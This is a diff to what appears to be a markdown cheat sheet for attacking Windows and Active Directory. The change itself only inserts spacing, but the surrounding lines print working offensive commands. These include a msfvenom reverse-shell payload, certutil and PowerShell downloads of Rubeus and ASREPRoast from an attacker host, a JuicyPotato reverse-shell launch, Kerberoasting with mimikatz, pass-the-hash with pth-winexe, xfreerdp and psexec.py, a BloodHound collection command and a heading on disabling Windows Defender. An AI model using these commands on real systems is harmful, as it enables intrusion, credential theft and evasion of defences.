@@ -41,11 +41,15 @@ msfvenom -p  windows/shell/reverse_tcp LHOST=192.168.119.126 LPORT=443 -f exe > 
 powershell.exe $ProgressPreference = 'SilentlyContinue'; Invoke-WebRequest http://192.168.50.48/ASREPRoast.ps1 -OutFile C:\users\hitman\ASREPRoast.ps1
 ```
 
+&nbsp;
+
 **[+] Upload file using certutil.exe**
 
 ```
 certutil.exe -urlcache -f http://192.168.50.48/Rubeus.exe C:\users\hitman\Rubeus.exe
 ```
+
+&nbsp;
 
 **[+] Transfer files using rdesktop tool (Available in Kali Linux)**
 
@@ -77,6 +81,8 @@ Note: You can access the share \\tsclient directly too
 JuicyPotato.exe -l 13373 -p c:\windows\system32\cmd.exe -a "/c c:/users/public/reverse.exe" -t *
 ```
 
+&nbsp;
+
 **[+] PowerUp.ps1 "Good powershell script for windows privilege escalation"**
 
 ```
@@ -86,6 +92,8 @@ PS C:\> Import-Module PowerUp.ps1
 
 PS C:\> Invoke-AllChecks | Out-File -Encoding ASCII checks.txt
 ```
+
+&nbsp;
 
 **[+] Weak service permissions privilege escalation**
 
@@ -141,17 +149,23 @@ Add-Type -AssemblyName System.IdentityModel
 New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLService/ufc-db1.us.funcorp.local"  
 ```
 
+&nbsp;
+
 **[+] Export Tickets using mimikatz**
 
 ```
 mimikatz # kerberos::list /export  
 ```
 
+&nbsp;
+
 **[+] Crack ticket using Tgsrepcrack.py (You can use john too or hashcat)**
 
 ```
 ./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.hitmanalharbi.local~1433-boo.LOCAL.kirbi  
 ```
+
+&nbsp;
 
 **[+] Kerberos Double-Hop problem (powershell)**
 
@@ -178,11 +192,15 @@ Invoke-Command -ComputerName UFC-JUMPSRV -Credential $cred -ScriptBlock {
 pth-winexe -U USER%aad3b435b51404eeaad3b435b51404ee:NTLM //IP cmd
 ```
 
+&nbsp;
+
 **[+] Access RDP using pass the hash (xfreerdp tool)**
 
 ```
 xfreerdp /u:username /pth:NTLM /d:domain /v:IP
 ```
+
+&nbsp;
 
 **[+] Pass the hash using PsExec.py**
 
@@ -205,6 +223,8 @@ python3 /usr/share/doc/python3-impacket/examples/psexec.py -hashes aad3b435b5140
 smbclient -L IP
 ```
 
+&nbsp;
+
 **[+] Sharphound command (For bloodhound)**
 
 ```
@@ -216,6 +236,8 @@ smbclient -L IP
 
 Invoke-BloodHound -CollectionMethod All
 ```
+
+&nbsp;
 
 **[+] Find interesting ACLs for specific user (Need PowerView.ps1)**
 
@@ -244,6 +266,8 @@ or run powershell like this:
 
 powershell.exe -ep bypass
 ```
+
+&nbsp;
 
 **[+] Disable windows defender**
 
